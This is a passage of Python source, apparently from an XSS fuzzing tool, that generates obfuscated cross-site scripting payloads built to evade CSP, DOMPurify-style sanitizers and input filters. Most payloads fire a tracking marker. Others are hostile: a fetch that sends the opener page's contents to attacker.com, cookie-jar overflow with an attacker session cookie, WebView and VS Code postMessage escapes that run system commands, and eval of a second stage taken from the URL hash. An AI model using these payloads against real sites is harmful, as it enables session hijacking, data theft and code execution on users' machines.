        import re

        variants = []
        pattern = r'\b(__XSS__|alert)\s*\(\s*([\'"])(.*?)\2\s*\)'
        for match in re.finditer(pattern, payload):
            replacement = f"{match.group(1)}`{match.group(3)}`"
            variant = payload[:match.start()] + replacement + payload[match.end():]
            if variant != payload:
                variants.append(variant)

        return variants if variants else [payload]

    @staticmethod
    def apply_script_breakout_comments(payload: str) -> List[str]:
        """Add parser-breakout comment wrappers useful inside script-adjacent contexts."""
        if '<' not in payload or '__XSS__' not in payload:
            return [payload]

        return [
            f'<!--{payload}//-->',
            f'</script>{payload}<script>',
            f'</title>{payload}',
            f'</textarea>{payload}',
            f'</noscript>{payload}',
        ]

    @staticmethod
    def apply_string_join_obfuscation(payload: str) -> str:
        """Replace string literals in scripts with Array join statements."""
        import re
        def repl(match):
            content = match.group(1)
            if not content or len(content) <= 3:
                return match.group(0)
            chunks = [content[i:i+2] for i in range(0, len(content), 2)]
            arr_repr = ",".join(f"'{c}'" for c in chunks)
            return f"[{arr_repr}].join('')"
        return re.sub(r'["\']([^"\']*)["\']', repl, payload)

    @staticmethod
    def apply_set_timeout_eval(payload: str) -> str:
        """Replace function calls with setTimeout evaluation blocks."""
        import re
        keywords = ['alert', 'eval']
        for kw in keywords:
            pattern = rf'\b{kw}\s*\((.*?)\)'
            def repl(match):
                arg = match.group(1)
                return f"setTimeout('{kw}({arg})',0)"
            payload = re.sub(pattern, repl, payload, flags=re.IGNORECASE)
        return payload

    @staticmethod
    def apply_property_accessor_obfuscation(payload: str) -> str:
        """Replace global object property access with dynamic brackets access."""
        import re
        properties = ['cookie', 'location', 'domain', 'write', 'createElement', 'body']
        for prop in properties:
            mid = len(prop) // 2
            split_prop = f"['{prop[:mid]}'+'{prop[mid:]}']"
            payload = re.sub(rf'\b\.{prop}\b', f"{split_prop}", payload)
        return payload

    @staticmethod
    def apply_data_script_src(payload: str) -> str:
        """Replace script contents with a base64 encoded data URI script source."""
        import re
        import base64
        
        def repl(match):
            code = match.group(1)
            if code:
                b64_code = base64.b64encode(code.encode()).decode()
                return f'<script src="data:text/javascript;base64,{b64_code}"></script>'
            return match.group(0)
            
        return re.sub(r'<script>(.*?)</script>', repl, payload, flags=re.DOTALL | re.IGNORECASE)

    @staticmethod
    def apply_all_mutations(
        payload: str,
        strategy: str = "default",
        protected_tokens: Optional[Sequence[str]] = None
    ) -> List[str]:
        """Apply all mutation techniques based on strategy.
        
        Args:
            payload: Original payload
            strategy: Mutation strategy name
            
        Returns:
            List of mutated payloads
        """
        mutations = [payload]  # Include original

        def safe(mutator: Callable[[str], str]) -> str:
            return MutationEngine._apply_to_unprotected(payload, protected_tokens, mutator)

        def expand(mutator: Callable[[str], Union[str, List[str]]]) -> List[str]:
            return MutationEngine._expand_unprotected(payload, protected_tokens, mutator)
        
        if strategy == "unicode_hunt":
            # Focus on Unicode bypasses
            mutations.append(safe(lambda value: MutationEngine.apply_homoglyphs(value, 0.5)))
            mutations.append(safe(lambda value: MutationEngine.apply_full_width(value, 0.5)))
            mutations.append(safe(lambda value: MutationEngine.apply_zero_width(value, 2)))
            mutations.extend(expand(MutationEngine.apply_keyword_splitting))
            mutations.extend(expand(MutationEngine.apply_recursive_nesting))
            mutations.append(safe(MutationEngine.apply_unicode_escapes))
            mutations.append(safe(MutationEngine.apply_string_concatenation))
            mutations.append(safe(MutationEngine.apply_array_join))
            mutations.append(safe(MutationEngine.apply_html5_named_entities))
            mutations.append(safe(MutationEngine.apply_padded_unicode_escapes))
            mutations.extend(expand(MutationEngine.apply_tag_case_variants))
            mutations.extend(expand(MutationEngine.apply_protocol_split_variants))
            mutations.extend(expand(MutationEngine.apply_entity_whitespace_variants))
            mutations.extend(expand(MutationEngine.apply_template_tag_calls))
            mutations.extend(expand(MutationEngine.apply_oracle_call_wrappers))
            mutations.extend(expand(MutationEngine.apply_script_breakout_comments))
        
        elif strategy == "encoding_hunt":
            # Focus on encoding bypasses
            mutations.append(safe(lambda value: MutationEngine.apply_html_entities(value, 0.5)))
            mutations.append(safe(lambda value: MutationEngine.apply_url_encoding(value, 0.5)))
            mutations.append(safe(MutationEngine.apply_mixed_case))
            mutations.append(safe(MutationEngine.apply_hex_escapes))
            mutations.append(safe(MutationEngine.apply_string_from_char_code))
            mutations.append(safe(MutationEngine.apply_base64_eval))
            mutations.append(safe(MutationEngine.apply_hex_entities))
            mutations.append(safe(MutationEngine.apply_octal_escapes))
            mutations.append(safe(MutationEngine.apply_double_html_entities))
            mutations.append(safe(MutationEngine.apply_decimal_entities))
            mutations.append(safe(MutationEngine.apply_url_hex_upper_encoding))
            mutations.append(safe(MutationEngine.apply_padded_decimal_entities))
            mutations.append(safe(MutationEngine.apply_padded_hex_entities))
            mutations.append(safe(MutationEngine.apply_semicolonless_entities))
            mutations.extend(expand(MutationEngine.apply_entity_whitespace_variants))
            mutations.extend(expand(MutationEngine.apply_recursive_nesting))
            mutations.extend(expand(MutationEngine.apply_protocol_split_variants))
            mutations.extend(expand(MutationEngine.apply_template_tag_calls))
            mutations.extend(expand(MutationEngine.apply_oracle_call_wrappers))
        
        elif strategy == "csp_aware":
            # Obfuscate spaces and handlers
            mutations.append(safe(MutationEngine.apply_slash_obfuscation))
            mutations.append(safe(lambda value: MutationEngine.apply_zero_width(value, 1)))
            mutations.append(safe(MutationEngine.apply_hex_entities))
            mutations.append(safe(MutationEngine.apply_base64_eval))
            mutations.append(safe(MutationEngine.apply_comment_obfuscation))
            mutations.append(safe(MutationEngine.apply_js_constructor_obfuscation))
            mutations.append(safe(MutationEngine.apply_alternative_whitespace))
            mutations.append(safe(MutationEngine.apply_data_uri_obfuscation))
            mutations.append(safe(MutationEngine.apply_location_hash_obfuscation))
            mutations.append(safe(MutationEngine.apply_js_function_constructor))
            mutations.append(safe(MutationEngine.apply_data_script_src))
            mutations.append(safe(MutationEngine.apply_iframe_srcdoc_wrapper))
            mutations.append(safe(MutationEngine.apply_svg_foreignobject_wrapper))
            mutations.append(safe(MutationEngine.apply_style_animation_wrapper))
            mutations.extend(expand(MutationEngine.apply_event_handler_separator_variants))
            mutations.extend(expand(MutationEngine.apply_recursive_nesting))
            mutations.extend(expand(MutationEngine.apply_protocol_split_variants))
            mutations.extend(expand(MutationEngine.apply_oracle_call_wrappers))
            mutations.extend(expand(MutationEngine.apply_template_tag_calls))
            mutations.extend(expand(MutationEngine.apply_script_breakout_comments))
            mutations.extend(expand(MutationEngine.apply_dom_clobbering))
            mutations.extend(expand(MutationEngine.apply_cookie_tossing))
            mutations.extend(expand(MutationEngine.apply_some_taint_theft))
            mutations.extend(expand(MutationEngine.apply_webview_sandbox_escape))
            mutations.extend(expand(MutationEngine.apply_cache_poisoning_bypass))
            mutations.extend(expand(MutationEngine.apply_webview_ipc_escape))
            mutations.extend(expand(MutationEngine.apply_postmessage_window_name_escape))
        
        
        
        elif strategy == "max_coverage":
            # COMBINE ALL KNOWN MUTATIONS (Unicode, Hex/Dec Entities, Obfuscations, and bypass formats)
            mutations.append(safe(lambda value: MutationEngine.apply_homoglyphs(value, 0.7)))
            mutations.append(safe(lambda value: MutationEngine.apply_full_width(value, 0.7)))
            mutations.append(safe(lambda value: MutationEngine.apply_zero_width(value, 2)))
            mutations.extend(expand(MutationEngine.apply_keyword_splitting))
            mutations.extend(expand(MutationEngine.apply_recursive_nesting))
            mutations.append(safe(MutationEngine.apply_unicode_escapes))
            mutations.append(safe(MutationEngine.apply_string_concatenation))
            mutations.append(safe(MutationEngine.apply_array_join))
            mutations.append(safe(MutationEngine.apply_html5_named_entities))
            mutations.append(safe(MutationEngine.apply_padded_unicode_escapes))
            mutations.extend(expand(MutationEngine.apply_tag_case_variants))
            
            mutations.append(safe(lambda value: MutationEngine.apply_html_entities(value, 0.7)))
            mutations.append(safe(lambda value: MutationEngine.apply_url_encoding(value, 0.7)))
            mutations.append(safe(MutationEngine.apply_mixed_case))
            mutations.append(safe(MutationEngine.apply_hex_escapes))
            mutations.append(safe(MutationEngine.apply_string_from_char_code))
            mutations.append(safe(MutationEngine.apply_base64_eval))
            mutations.append(safe(MutationEngine.apply_hex_entities))
            mutations.append(safe(MutationEngine.apply_octal_escapes))
            mutations.append(safe(MutationEngine.apply_double_html_entities))
            mutations.append(safe(MutationEngine.apply_decimal_entities))
            mutations.append(safe(MutationEngine.apply_url_hex_upper_encoding))
            mutations.append(safe(MutationEngine.apply_padded_decimal_entities))
            
            mutations.append(safe(MutationEngine.apply_slash_obfuscation))
            mutations.append(safe(MutationEngine.apply_comment_obfuscation))
            mutations.append(safe(MutationEngine.apply_js_constructor_obfuscation))
            mutations.append(safe(MutationEngine.apply_alternative_whitespace))
            mutations.append(safe(MutationEngine.apply_data_uri_obfuscation))
            mutations.append(safe(MutationEngine.apply_location_hash_obfuscation))
            mutations.append(safe(MutationEngine.apply_js_function_constructor))
            mutations.append(safe(MutationEngine.apply_data_script_src))
            mutations.append(safe(MutationEngine.apply_iframe_srcdoc_wrapper))
            mutations.append(safe(MutationEngine.apply_svg_foreignobject_wrapper))
            mutations.append(safe(MutationEngine.apply_style_animation_wrapper))
            
            mutations.extend(expand(MutationEngine.apply_event_handler_separator_variants))
            mutations.extend(expand(MutationEngine.apply_protocol_split_variants))
            mutations.extend(expand(MutationEngine.apply_oracle_call_wrappers))
            mutations.extend(expand(MutationEngine.apply_template_tag_calls))
            mutations.extend(expand(MutationEngine.apply_script_breakout_comments))
            mutations.extend(expand(MutationEngine.apply_entity_whitespace_variants))
            mutations.extend(expand(MutationEngine.apply_dom_clobbering))
            mutations.extend(expand(MutationEngine.apply_cookie_tossing))
            mutations.extend(expand(MutationEngine.apply_some_taint_theft))
            mutations.extend(expand(MutationEngine.apply_webview_sandbox_escape))
            mutations.extend(expand(MutationEngine.apply_cache_poisoning_bypass))
            mutations.extend(expand(MutationEngine.apply_webview_ipc_escape))
            mutations.extend(expand(MutationEngine.apply_postmessage_window_name_escape))
        
        
        
        elif strategy == "genetic_evolutionary":
            # Feedback-driven genetic evolutionary mutations targeting CSP & DOMPurify/Sanitizers
            mutations.append(safe(MutationEngine.apply_mixed_case))
            mutations.append(safe(lambda value: MutationEngine.apply_zero_width(value, 1)))
            mutations.append(safe(MutationEngine.apply_slash_obfuscation))
            mutations.append(safe(MutationEngine.apply_comment_obfuscation))
            mutations.append(safe(MutationEngine.apply_alternative_whitespace))
            mutations.append(safe(MutationEngine.apply_string_join_obfuscation))
            mutations.append(safe(MutationEngine.apply_set_timeout_eval))
            mutations.append(safe(MutationEngine.apply_property_accessor_obfuscation))
            
            # CSP Bypasses
            mutations.extend(expand(MutationEngine.apply_csp_bypass_cdn))
            mutations.extend(expand(MutationEngine.apply_csp_bypass_angular))
            mutations.extend(expand(MutationEngine.apply_framework_directives))
            
            # Sanitizer / mXSS Bypasses
            mutations.extend(expand(MutationEngine.apply_mxss_nesting))
            mutations.extend(expand(MutationEngine.apply_mxss_namespaced))
            
            mutations.extend(expand(MutationEngine.apply_event_handler_separator_variants))
            mutations.extend(expand(MutationEngine.apply_recursive_nesting))
            mutations.extend(expand(MutationEngine.apply_protocol_split_variants))
            mutations.extend(expand(MutationEngine.apply_template_tag_calls))
            mutations.extend(expand(MutationEngine.apply_oracle_call_wrappers))
            mutations.extend(expand(MutationEngine.apply_script_breakout_comments))
            mutations.extend(expand(MutationEngine.apply_dom_clobbering))
            mutations.extend(expand(MutationEngine.apply_cookie_tossing))
            mutations.extend(expand(MutationEngine.apply_some_taint_theft))
            mutations.extend(expand(MutationEngine.apply_webview_sandbox_escape))
            mutations.extend(expand(MutationEngine.apply_cache_poisoning_bypass))
            mutations.extend(expand(MutationEngine.apply_webview_ipc_escape))
            mutations.extend(expand(MutationEngine.apply_postmessage_window_name_escape))
        
        

        else:  # default or quick_light
            # Light mutations
            mutations.append(safe(MutationEngine.apply_mixed_case))
            mutations.append(safe(lambda value: MutationEngine.apply_zero_width(value, 1)))
            mutations.append(safe(MutationEngine.apply_slash_obfuscation))
            mutations.append(safe(MutationEngine.apply_string_concatenation))
            mutations.append(safe(MutationEngine.apply_array_join))
            mutations.append(safe(MutationEngine.apply_comment_obfuscation))
            mutations.append(safe(MutationEngine.apply_alternative_whitespace))
            mutations.append(safe(MutationEngine.apply_string_join_obfuscation))
            mutations.append(safe(MutationEngine.apply_set_timeout_eval))
            mutations.append(safe(MutationEngine.apply_property_accessor_obfuscation))
            mutations.extend(expand(MutationEngine.apply_event_handler_separator_variants))
            mutations.extend(expand(MutationEngine.apply_recursive_nesting))
            mutations.extend(expand(MutationEngine.apply_protocol_split_variants))
            mutations.extend(expand(MutationEngine.apply_template_tag_calls))
            mutations.extend(expand(MutationEngine.apply_oracle_call_wrappers))
            mutations.extend(expand(MutationEngine.apply_script_breakout_comments))
        
        # Remove duplicates
        return list(dict.fromkeys(mutations))

    @staticmethod
    def apply_csp_bypass_cdn(payload: str) -> List[str]:
        """Wrap payload to load libraries from allowed CDNs that support template execution or gadget bypasses."""
        token = MutationEngine._extract_token_from_payload(payload)
        
        return [
            f'<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.10/angular.min.js"></script><div ng-app>{{{{constructor.constructor(\'__XSS__("{token}")\')()}}}}</div>',
            f'<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.10/angular.min.js"></script><div ng-app>{{{{constructor.constructor(\'__XSS__("{token}")\')()}}}}</div>',
            f'<script src="https://unpkg.com/angular@1.6.10/angular.min.js"></script><div ng-app>{{{{constructor.constructor(\'__XSS__("{token}")\')()}}}}</div>',
            f'<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js"></script><img src=x onerror="__XSS__(\'{token}\')">',
        ]

    @staticmethod
    def apply_csp_bypass_angular(payload: str) -> List[str]:
        """Convert standard JS expressions into AngularJS / client-side template injection payloads."""
        token = MutationEngine._extract_token_from_payload(payload)
        
        return [
            f"{{{{constructor.constructor('__XSS__(\"{token}\")')()}}}}",
            f"<div ng-app>{{{{constructor.constructor('__XSS__(\"{token}\")')()}}}}</div>",
            f"<div ng-controller=\"a\">{{{{$eval.constructor('__XSS__(\"{token}\")')()}}}}</div>",
            f"{{{{_c.constructor('__XSS__(\"{token}\")')()}}}}",
            f"<div id=\"app\">{{{{_c.constructor('__XSS__(\"{token}\")')()}}}}</div>"
        ]

    @staticmethod
    def apply_framework_directives(payload: str) -> List[str]:
        """Generate Vue, React, Svelte, Alpine.js, and Markdown renderer template injection and attribute bypasses."""
        token = MutationEngine._extract_token_from_payload(payload)
        import base64
        b64_payload = base64.b64encode(f"<script>__XSS__('{token}')</script>".encode()).decode()
        
        return [
            f"<div v-html=\"'<img src=x onerror=__XSS__(\\'{token}\\')>'\"></div>",
            f"{{{{_setupCtx.set.constructor('__XSS__(\"{token}\")')()}}}}",
            f"<div v-bind:id=\"'x'\" v-on:click=\"$eval('__XSS__(\"{token}\")')\">click</div>",
            f"<div x-data=\"{{}}\" x-init=\"__XSS__('{token}')\"></div>",
            f"<div x-data=\"{{}}\" x-text=\"__XSS__('{token}')\"></div>",
            f"<div dangerouslySetInnerHTML={{{{'__html': '<img src=x onerror=__XSS__(\'{token}\')>'}}}} />",
            f"{{@html '<img src=x onerror=__XSS__(\\'{token}\\')>'}}",
            f"[link](javascript:__XSS__('{token}'))",
            f"[link](javascript:__XSS__`{token}`)",
            f"[link](data:text/html;base64,{b64_payload})",
            f"![image](x\"onerror=\"__XSS__('{token}')\")",
        ]

    @staticmethod
    def _extract_token_from_payload(payload: str) -> str:
        """Extract tracking token from mutated payload strings."""
        import re
        m = re.search(r'__XSS__\([\'"`]?([a-zA-Z0-9_-]+)[\'"`]?\)', payload)
        if m:
            return m.group(1)
        m = re.search(r'__XSS__`([a-zA-Z0-9_-]+)`', payload)
        if m:
            return m.group(1)
        m = re.search(r'\b([a-fA-F0-9]{32})\b', payload)
        if m:
            return m.group(1)
        return "TOKEN"

    @staticmethod
    def apply_mxss_nesting(payload: str) -> List[str]:
        """Wrap payload inside complex mathematical/SVG tags for mXSS parser differential bypasses."""
        token = MutationEngine._extract_token_from_payload(payload)
        
        return [
            f'<math><mtext><table><a href="&lt;/table&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;">',
            f'<math><mtext><table><a href="&lt;/table&gt;&lt;svg onload=__XSS__(\'{token}\')&gt;">',
            f'<math><annotation-xml encoding="text/html"><svg><desc><rect class="&lt;/g&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;"></rect></desc></svg></annotation-xml></math>',
            f'<noscript><p title="&lt;/noscript&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;"></p></noscript>',
            f'<math><mtext><a><desc><x class="&lt;/desc&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;"></x></desc></a></mtext></math>',
            f'<svg><desc><template><img src=x onerror=__XSS__(\'{token}\')></template></desc></svg>'
        ]

    @staticmethod
    def apply_mxss_namespaced(payload: str) -> List[str]:
        """Wrap payload in HTML/SVG namespaced attribute parser differential formats."""
        token = MutationEngine._extract_token_from_payload(payload)
        
        return [
            f'<div id="x" class="&lt;style&gt;&lt;/style&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;">',
            f'<svg><animate xlink:href=#x attributeName=href values="javascript:__XSS__(\'{token}\')" /><a id=x><rect width=100 height=100 /></a></svg>',
            f'<svg><animate xlink:href=#x attributeName=href values="javascript:__XSS__`{token}`" /><a id=x><rect width=100 height=100 /></a></svg>'
        ]

    @staticmethod
    def apply_cookie_tossing(payload: str) -> List[str]:
        """Generate cookie tossing payloads to overflow the cookie jar and set path-specific shadow cookies."""
        action = payload
        if "javascript:" in action.lower():
            action = action.replace("javascript:", "")
        cookie_payload = (
            f"for(let i=500;i--;)document.cookie=`overflow${{i}}=${{i}};path=/;domain=.${{location.hostname.split('.').slice(-2).join('.')}};Secure`;"
            f"document.cookie=`session_id=ATTACKER_SESSION;path=/settings/billing;domain=.${{location.hostname.split('.').slice(-2).join('.')}};Secure`;"
            f"{action}"
        )
        return [
            f"<script>{cookie_payload}</script>",
            f"<svg onload=\"{cookie_payload}\">",
            f"javascript:{cookie_payload}"
        ]

    @staticmethod
    def apply_some_taint_theft(payload: str) -> List[str]:
        """Generate Same-Origin Method Execution (SOME) payloads to read opener document contents cross-window."""
        steal_payload = (
            "if(window.opener){"
            "fetch('https://attacker.com/leak?data='+btoa(window.opener.document.body.innerHTML))"
            "}"
        )
        return [
            f"<script>{steal_payload}</script>",
            f"<svg onload=\"{steal_payload}\">",
            f"javascript:{steal_payload}"
        ]

    @staticmethod
    def apply_webview_sandbox_escape(payload: str) -> List[str]:
        """Generate WebView sandbox escape bridge payloads (like Android JS interface CVE-2026-5429 / legacy bridges)."""
        escape_payload = (
            "try{"
            "for(let k in window){"
            "if(window[k]&&typeof window[k]==='object'&&'getClass'in window[k]){"
            "window[k].getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id');"
            "}"
            "}"
            "}catch(e){}"
        )
        return [
            f"<script>{escape_payload}</script>",
            f"<svg onload=\"{escape_payload}\">",
            f"javascript:{escape_payload}"
        ]

    @staticmethod
    def apply_cache_poisoning_bypass(payload: str) -> List[str]:
        """Generate short payload that reads a second-stage payload from URL hash/localStorage to bypass size limits."""
        loop_payload = (
            "setInterval(()=>{if(document.cookie.includes('session')){document.cookie='session=payload;path=/';}},1);"
        )
        hash_payload = (
            "eval(decodeURI(atob(window.location.hash.slice(1))))"
        )
        return [
            f"<script>{loop_payload}</script>",
            f"<script>{hash_payload}</script>",
            f"javascript:{hash_payload}"
        ]

    @staticmethod
    def apply_webview_ipc_escape(payload: str) -> List[str]:
        """Generate WebView IPC boundary escape payloads (e.g. VS Code/Electron postMessage subprocess execution)."""
        ipc_payload = (
            "try{"
            "if(typeof vscode!=='undefined'&&vscode.postMessage){"
            "vscode.postMessage({messageType:'subprocess',data:{command:'/usr/bin/open -a Calculator'},messageId:'poc'});"
            "}"
            "if(typeof window.chrome!=='undefined'&&window.chrome.webview){"
            "window.chrome.webview.postMessage({action:'execute',cmd:'id'});"
            "}"
            "}catch(e){}"
        )
        return [
            f"<script>{ipc_payload}</script>",
            f"<svg onload=\"{ipc_payload}\">",
            f"javascript:{ipc_payload}"
        ]

    @staticmethod
    def apply_postmessage_window_name_escape(payload: str) -> List[str]:
        """Generate window.name persistence + wildcard postMessage sandbox escape payloads."""
        escape_payload = (
            "try{"
            "window.parent.postMessage({type:'itworked'},'*');"
            "setInterval(()=>{"
            "if(window.parent&&window.parent.opener){"
            "for(let i=0;i<window.parent.opener.frames.length;i++){"
            "let d=window.parent.opener.frames[i].document.body.innerHTML;"
            "if(d)window.parent.postMessage({type:'docbody',body:d},'*');"
            "}"
            "}"
            "},1000);"
            "}catch(e){}"
        )
        return [
            f"<script>{escape_payload}</script>",
            f"<svg onload=\"{escape_payload}\">",
            f"javascript:{escape_payload}"
        ]



